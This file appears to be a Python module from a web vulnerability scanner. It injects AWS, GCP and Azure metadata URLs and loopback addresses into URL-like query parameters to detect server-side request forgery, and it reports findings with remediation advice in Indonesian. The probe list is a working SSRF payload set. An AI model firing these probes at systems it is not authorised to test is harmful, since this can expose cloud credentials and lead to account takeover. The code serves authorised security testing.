"""Cloud metadata SSRF probe (extension of basic SSRF module)."""
from __future__ import annotations

from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.recon.crawler import get_state

URL_PARAM_HINTS = ("url", "uri", "redirect", "next", "image", "fetch", "dest", "callback",
                   "src", "target", "feed", "host")
PROBES = [
    ("http://169.254.169.254/latest/meta-data/", "AWS metadata", "ami-id"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata", "instance/"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata", "compute"),
    ("http://[::1]/", "IPv6 loopback", ""),
    ("http://0.0.0.0/", "wildcard 0.0.0.0", ""),
]


def _candidates(base_url: str, urls: list[str]) -> list[str]:
    pool = set([base_url] + urls)
    out = []
    for u in pool:
        q = urlparse(u).query
        if not q:
            continue
        for k, _ in parse_qsl(q, keep_blank_values=True):
            if any(h in k.lower() for h in URL_PARAM_HINTS):
                out.append(u)
                break
    return out[:10]


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    state = get_state(config)
    urls = state.param_urls if state else []
    candidates = _candidates(target.base_url, urls)
    if not candidates:
        return findings
    client = HttpClient(config)
    try:
        for url in candidates:
            parsed = urlparse(url)
            params = parse_qsl(parsed.query, keep_blank_values=True)
            for i, (k, _) in enumerate(params):
                if not any(h in k.lower() for h in URL_PARAM_HINTS):
                    continue
                for probe_url, label, marker in PROBES:
                    new = list(params)
                    new[i] = (k, probe_url)
                    mutated = urlunparse(parsed._replace(query=urlencode(new)))
                    headers = {"Metadata": "true", "Metadata-Flavor": "Google"}
                    r = client.get(mutated, headers=headers)
                    if r is None or r.status_code >= 500:
                        continue
                    body = (r.text or "").lower()
                    if marker and marker in body:
                        findings.append(Finding(
                            module="ssrf_metadata",
                            title=f"SSRF berhasil mencapai endpoint cloud metadata ({label})",
                            severity=Severity.CRITICAL,
                            description=("Server fetch URL yang diset attacker dan mengembalikan "
                                         f"respons dari {label}. Ini bisa membocorkan IAM "
                                         "credential dan mengarah ke RCE / takeover akun cloud."),
                            target=mutated,
                            evidence=f"marker `{marker}` ditemukan di body",
                            cwe="CWE-918",
                            remediation=("Blokir IP private (169.254.0.0/16, 127.0.0.0/8, dll) "
                                         "di lapisan fetch. Untuk AWS, migrasi ke IMDSv2 "
                                         "(`hop-limit=1`)."),
                        ))
                        return findings
    finally:
        client.close()
    return findings
